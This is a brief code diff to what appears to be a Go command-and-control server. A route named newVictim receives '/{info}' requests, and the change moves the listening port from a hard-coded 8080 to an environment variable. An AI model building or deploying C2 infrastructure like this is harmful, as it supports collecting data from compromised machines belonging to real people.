@@ -55,6 +55,7 @@ func main() {
 
 	router.HandleFunc("/{info}", newVictim).Methods("GET")
 
-	fmt.Printf("\033[34m\n[*] C2 listening on port 8080 ... \n\n")
-	http.ListenAndServe(":8080", router)
+	PORT := os.Getenv("PORT")
+	fmt.Printf("\033[34m\n[*] C2 listening on port %s ... \n\n", PORT)
+	http.ListenAndServe(PORT, router)
 }
